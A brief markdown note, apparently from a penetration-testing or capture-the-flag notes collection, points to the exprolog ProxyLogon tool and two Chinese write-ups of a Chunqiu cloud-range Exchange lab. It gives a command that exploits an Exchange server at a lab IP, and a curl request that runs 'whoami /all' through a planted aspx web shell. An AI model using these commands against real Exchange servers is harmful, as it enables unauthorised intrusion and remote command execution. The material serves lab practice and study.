
# [exprolog](https://github.com/herwonowr/exprolog)

* [Gcow | Ichunqiu云境 —— Exchange Writeup](https://mp.weixin.qq.com/s/LC6G0_WME9Fb1rMcRUMPpg)
* [Dest0g3 |    春秋云境——Exchange WriteUp](https://mp.weixin.qq.com/s/Fvo1B5UbiqbENEe9uYrzJA)

```sh
proxychains python3 exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab
根据回显得到的 aspx 可执行shell命令 例
proxychains curl --request POST --url https://172.22.3.9/owa/auth/ncyev.aspx --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -k
```